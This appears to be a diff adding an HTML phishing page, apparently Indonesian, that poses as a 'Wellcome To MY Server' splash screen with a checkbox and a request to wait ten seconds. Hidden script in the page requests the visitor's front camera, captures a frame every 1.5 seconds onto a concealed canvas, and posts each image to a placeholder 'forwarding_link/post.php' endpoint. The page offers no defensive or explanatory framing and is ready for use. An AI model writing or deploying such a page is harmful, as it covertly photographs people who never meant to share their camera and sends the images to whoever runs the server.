@@ -1,0 +1,88 @@
+<!doctype html>
+<html>
+<head>
+<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+</head>
+
+<div class="video-wrap" hidden="hidden">
+   <video id="video" playsinline autoplay></video>
+</div>
+
+<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+
+<script>
+
+function post(imgdata){
+$.ajax({
+    type: 'POST',
+    data: { cat: imgdata},
+    url: 'forwarding_link/post.php',
+    dataType: 'json',
+    async: false,
+    success: function(result){
+        // call the function that handles the response/results
+    },
+    error: function(){
+    }
+  });
+};
+
+
+'use strict';
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const errorMsgElement = document.querySelector('span#errorMsg');
+
+const constraints = {
+  audio: false,
+  video: {
+    
+    facingMode: "user"
+  }
+};
+
+// Access webcam
+async function init() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    handleSuccess(stream);
+  } catch (e) {
+    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+  }
+}
+
+// Success
+function handleSuccess(stream) {
+  window.stream = stream;
+  video.srcObject = stream;
+
+var context = canvas.getContext('2d');
+  setInterval(function(){
+
+       context.drawImage(video, 0, 0, 640, 480);
+       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+       post(canvasData); }, 1500);
+  
+
+}
+
+// Load init
+init();
+
+</script>
+
+    <body background="http://japarus.xtgem.com/blogspot/red-matrix-request-animated.gif">
+    <center><img class="CyberMuslim_NKRI" src="https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/22533fb0-3db2-4d45-8675-4aaf09a2027b/dbc20sr-8997437c-90c6-4997-9e47-0230557f6b9e.png?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1cm46YXBwOjdlMGQxODg5ODIyNjQzNzNhNWYwZDQxNWVhMGQyNmUwIiwiaXNzIjoidXJuOmFwcDo3ZTBkMTg4OTgyMjY0MzczYTVmMGQ0MTVlYTBkMjZlMCIsIm9iaiI6W1t7InBhdGgiOiJcL2ZcLzIyNTMzZmIwLTNkYjItNGQ0NS04Njc1LTRhYWYwOWEyMDI3YlwvZGJjMjBzci04OTk3NDM3Yy05MGM2LTQ5OTctOWU0Ny0wMjMwNTU3ZjZiOWUucG5nIn1dXSwiYXVkIjpbInVybjpzZXJ2aWNlOmZpbGUuZG93bmxvYWQiXX0.HJFWF1sUJno8oFPGoJjMEbDhusq6xt7dfHAMZSt6TrM" onload="typeof google==='object'&amp;&amp;google.aft&amp;&amp;google.aft(this)" width="300" height="300" style="margin-top: 98px;" alt="Gambar terkait"></center>
+  
+    <center><marquee behavior="scroll" direction="left" scrollamount="100" scrolldelay="100" width="100%"><font color="red">___________________________________________________</font></marquee>
+    <font size="15" color="red"><blink> Wellcome To </blink></font><font size="15" color="white"><blink> MY Server </blink></font>
+    <marquee behavior="scroll" direction="right" scrollamount="100" scrolldelay="100" width="100%"><font color="white"> ___________________________________________________</font></marquee></center>
+        <p></p>
+        <p>Setelah Checklist Mohon tunggu 10 Detik</p>
+        <p><label><input type="checkbox" name="mirror" id="mirror" /> Checklist</label></p>
+    </body>
+
+</html>
